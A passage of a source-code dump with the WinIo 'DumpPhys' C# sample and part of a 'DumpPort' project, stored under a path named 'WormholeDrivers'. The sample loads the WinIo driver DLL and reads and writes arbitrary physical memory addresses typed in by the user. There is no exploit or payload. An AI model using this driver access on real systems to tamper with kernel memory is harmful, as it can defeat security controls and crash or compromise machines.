        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.btnGetValue = new System.Windows.Forms.Button();
            this.btnSetValue = new System.Windows.Forms.Button();
            this.btnQuit = new System.Windows.Forms.Button();
            this.txtPhysAddr = new System.Windows.Forms.TextBox();
            this.txtValue = new System.Windows.Forms.TextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(30, 138);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(176, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "Please enter physical address (hex):";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(30, 167);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(63, 13);
            this.label2.TabIndex = 1;
            this.label2.Text = "Value (hex):";
            // 
            // btnGetValue
            // 
            this.btnGetValue.Location = new System.Drawing.Point(32, 231);
            this.btnGetValue.Name = "btnGetValue";
            this.btnGetValue.Size = new System.Drawing.Size(75, 23);
            this.btnGetValue.TabIndex = 2;
            this.btnGetValue.Text = "Get Value";
            this.btnGetValue.UseVisualStyleBackColor = true;
            this.btnGetValue.Click += new System.EventHandler(this.btnGetValue_Click);
            // 
            // btnSetValue
            // 
            this.btnSetValue.Location = new System.Drawing.Point(138, 231);
            this.btnSetValue.Name = "btnSetValue";
            this.btnSetValue.Size = new System.Drawing.Size(75, 23);
            this.btnSetValue.TabIndex = 3;
            this.btnSetValue.Text = "Set Value";
            this.btnSetValue.UseVisualStyleBackColor = true;
            this.btnSetValue.Click += new System.EventHandler(this.btnSetValue_Click);
            // 
            // btnQuit
            // 
            this.btnQuit.Location = new System.Drawing.Point(244, 231);
            this.btnQuit.Name = "btnQuit";
            this.btnQuit.Size = new System.Drawing.Size(75, 23);
            this.btnQuit.TabIndex = 4;
            this.btnQuit.Text = "Quit";
            this.btnQuit.UseVisualStyleBackColor = true;
            this.btnQuit.Click += new System.EventHandler(this.btnQuit_Click);
            // 
            // txtPhysAddr
            // 
            this.txtPhysAddr.Location = new System.Drawing.Point(212, 135);
            this.txtPhysAddr.Name = "txtPhysAddr";
            this.txtPhysAddr.Size = new System.Drawing.Size(108, 20);
            this.txtPhysAddr.TabIndex = 5;
            // 
            // txtValue
            // 
            this.txtValue.Location = new System.Drawing.Point(99, 164);
            this.txtValue.MaxLength = 8;
            this.txtValue.Name = "txtValue";
            this.txtValue.Size = new System.Drawing.Size(59, 20);
            this.txtValue.TabIndex = 6;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 26.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(81, 22);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(188, 39);
            this.label3.TabIndex = 7;
            this.label3.Text = "DumpPhys";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(63, 73);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(225, 16);
            this.label4.TabIndex = 8;
            this.label4.Text = "Copyright 1998-2010 by Yariv Kaplan";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.Location = new System.Drawing.Point(117, 102);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(117, 16);
            this.label5.TabIndex = 9;
            this.label5.Text = "www.internals.com";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(350, 272);
            this.ControlBox = false;
            this.Controls.Add(this.label5);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.txtValue);
            this.Controls.Add(this.txtPhysAddr);
            this.Controls.Add(this.btnQuit);
            this.Controls.Add(this.btnSetValue);
            this.Controls.Add(this.btnGetValue);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.Name = "Form1";
            this.Text = "DumpPhys - www.internals.com";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Button btnGetValue;
        private System.Windows.Forms.Button btnSetValue;
        private System.Windows.Forms.Button btnQuit;
        private System.Windows.Forms.TextBox txtPhysAddr;
        private System.Windows.Forms.TextBox txtValue;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label label5;
    }
}


```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/Form1.cs`:

```cs
// ---------------------------------------------------- //
//                      WinIo v3.0                      //
//          Direct Hardware Access Under Windows        //
//           Copyright 1998-2010 Yariv Kaplan           //
//               http://www.internals.com               //
// ---------------------------------------------------- //

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace DumpPhys
{
    public unsafe partial class Form1 : Form
    {
        [DllImport("kernel32.dll")]
        private extern static IntPtr LoadLibrary(String DllName);

        [DllImport("kernel32.dll")]
        private extern static IntPtr GetProcAddress(IntPtr hModule, String ProcName);

        [DllImport("kernel32")]
        private extern static bool FreeLibrary(IntPtr hModule);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool InitializeWinIoType();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool GetPhysLongType(IntPtr PhysAddr, UInt32 *pPhysVal);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool SetPhysLongType(IntPtr PhysAddr, UInt32 PhysVal);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool ShutdownWinIoType();

        IntPtr hMod;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Check if this is a 32 bit or 64 bit system
            if (IntPtr.Size == 4)
            {
                hMod = LoadLibrary("WinIo32.dll");
                txtPhysAddr.MaxLength = 8;
                txtPhysAddr.Text = "00000000";
                
            }
            else if (IntPtr.Size == 8)
            {
                hMod = LoadLibrary("WinIo64.dll");
                txtPhysAddr.MaxLength = 16;
                txtPhysAddr.Text = "0000000000000000";
            }

            if (hMod == IntPtr.Zero)
            {
                MessageBox.Show("Can't find WinIo dll.\nMake sure the WinIo library files are located in the same directory as your executable file.", "DumpPhys", MessageBoxButtons.OK, MessageBoxIcon.Error);
                this.Close();
            }

            IntPtr pFunc = GetProcAddress(hMod, "InitializeWinIo");

            if (pFunc != IntPtr.Zero)
            {
                InitializeWinIoType InitializeWinIo = (InitializeWinIoType)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(InitializeWinIoType));
                bool Result = InitializeWinIo();

                if (!Result)
                {
                    MessageBox.Show("Error returned from InitializeWinIo.\nMake sure you are running with administrative privileges and that the WinIo library files are located in the same directory as your executable file.", "DumpPhys", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    FreeLibrary(hMod);
                    this.Close();
                }
            }

            btnGetValue_Click(this, null);
        }

        private void btnGetValue_Click(object sender, EventArgs e)
        {
            IntPtr pFunc = GetProcAddress(hMod, "GetPhysLong");

            if (pFunc != IntPtr.Zero)
            {
                UInt32 PhysVal;
                UInt64 PhysAddr64;

                PhysAddr64 = UInt64.Parse(txtPhysAddr.Text, System.Globalization.NumberStyles.HexNumber);

                GetPhysLongType GetPhysLong = (GetPhysLongType)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(GetPhysLongType));

                // Call WinIo to get value
                bool Result = GetPhysLong((IntPtr)PhysAddr64, &PhysVal);

                if (Result)
                {
                    txtValue.Text = PhysVal.ToString("X");
                }
                else
                {
                    MessageBox.Show("Error returned from GetPhysLong", "DumpPhys", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void btnQuit_Click(object sender, EventArgs e)
        {
            IntPtr pFunc = GetProcAddress(hMod, "ShutdownWinIo");

            if (pFunc != IntPtr.Zero)
            {
                ShutdownWinIoType ShutdownWinIo = (ShutdownWinIoType)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(ShutdownWinIoType));

                ShutdownWinIo();
                FreeLibrary(hMod);
            }
            
            this.Close();
        }

        private void btnSetValue_Click(object sender, EventArgs e)
        {
            IntPtr pFunc = GetProcAddress(hMod, "SetPhysLong");

            if (pFunc != IntPtr.Zero)
            {
                UInt32 PhysVal;
                UInt64 PhysAddr64;

                PhysAddr64 = UInt64.Parse(txtPhysAddr.Text, System.Globalization.NumberStyles.HexNumber);
                PhysVal = UInt32.Parse(txtValue.Text, System.Globalization.NumberStyles.HexNumber);

                SetPhysLongType SetPhysLong = (SetPhysLongType)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(SetPhysLongType));

                // Call WinIo to set value
                bool Result = SetPhysLong((IntPtr)PhysAddr64, PhysVal);

                if (!Result)
                {
                    MessageBox.Show("Error returned from SetPhysLong", "DumpPhys", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}
```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/Form1.resx`:

```resx
<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
</root>
```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/Program.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace DumpPhys
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following 
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("DumpPhys")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("www.internals.com")]
[assembly: AssemblyProduct("DumpPhys")]
[assembly: AssemblyCopyright("Copyright © Yariv Kaplan 2010")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible 
// to COM components.  If you need to access a type in this assembly from 
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("16fd1afb-d769-4e14-89ba-eef3670c272b")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version 
//      Build Number
//      Revision
//
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/Properties/Resources.Designer.cs`:

```cs
//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:2.0.50727.4927
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace DumpPhys.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "2.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("DumpPhys.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
    }
}

```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/Properties/Resources.resx`:

```resx
<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
</root>
```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/Properties/Settings.Designer.cs`:

```cs
//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:2.0.50727.4927
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace DumpPhys.Properties {
    
    
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "9.0.0.0")]
    internal sealed partial class Settings : global::System.Configuration.ApplicationSettingsBase {
        
        private static Settings defaultInstance = ((Settings)(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings())));
        
        public static Settings Default {
            get {
                return defaultInstance;
            }
        }
    }
}

```

`source/WormholeDrivers/WINIO/Samples/DumpPhys/DumpPhys/Properties/Settings.settings`:

```settings
<?xml version='1.0' encoding='utf-8'?>
<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)">
  <Profiles>
    <Profile Name="(Default)" />
  </Profiles>
  <Settings />
</SettingsFile>

```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 10.00
# Visual Studio 2008
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "DumpPort", "DumpPort\DumpPort.csproj", "{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Debug|x86 = Debug|x86
		Release|Any CPU = Release|Any CPU
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}.Debug|x86.ActiveCfg = Debug|x86
		{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}.Debug|x86.Build.0 = Debug|x86
		{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}.Release|Any CPU.Build.0 = Release|Any CPU
		{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}.Release|x86.ActiveCfg = Release|x86
		{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}.Release|x86.Build.0 = Release|x86
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal

```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/DumpPort.csproj`:

```csproj
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="3.5">
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProductVersion>9.0.21022</ProductVersion>
    <SchemaVersion>2.0</SchemaVersion>
    <ProjectGuid>{8E2C04F3-BDE2-49A4-8736-DE12944D5DDF}</ProjectGuid>
    <OutputType>WinExe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>DumpPort</RootNamespace>
    <AssemblyName>DumpPort</AssemblyName>
    <FileUpgradeFlags>
    </FileUpgradeFlags>
    <OldToolsVersion>2.0</OldToolsVersion>
    <UpgradeBackupLocation>
    </UpgradeBackupLocation>
    <PublishUrl>publish\</PublishUrl>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateMode>Foreground</UpdateMode>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <MapFileExtensions>true</MapFileExtensions>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <UseApplicationTrust>false</UseApplicationTrust>
    <BootstrapperEnabled>true</BootstrapperEnabled>
    <ApplicationManifest>DumpPort.manifest</ApplicationManifest>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
    <DebugSymbols>true</DebugSymbols>
    <OutputPath>bin\x86\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
    <DebugType>full</DebugType>
    <PlatformTarget>x86</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
    <OutputPath>bin\x86\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
    <Optimize>true</Optimize>
    <DebugType>pdbonly</DebugType>
    <PlatformTarget>x86</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Data" />
    <Reference Include="System.Deployment" />
    <Reference Include="System.Drawing" />
    <Reference Include="System.Windows.Forms" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Form1.cs">
      <SubType>Form</SubType>
    </Compile>
    <Compile Include="Form1.Designer.cs">
      <DependentUpon>Form1.cs</DependentUpon>
    </Compile>
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <EmbeddedResource Include="Form1.resx">
      <SubType>Designer</SubType>
      <DependentUpon>Form1.cs</DependentUpon>
    </EmbeddedResource>
    <EmbeddedResource Include="Properties\Resources.resx">
      <Generator>ResXFileCodeGenerator</Generator>
      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
      <SubType>Designer</SubType>
    </EmbeddedResource>
    <Compile Include="Properties\Resources.Designer.cs">
      <AutoGen>True</AutoGen>
      <DependentUpon>Resources.resx</DependentUpon>
      <DesignTime>True</DesignTime>
    </Compile>
    <None Include="DumpPort.manifest" />
    <None Include="Properties\Settings.settings">
      <Generator>SettingsSingleFileGenerator</Generator>
      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
    </None>
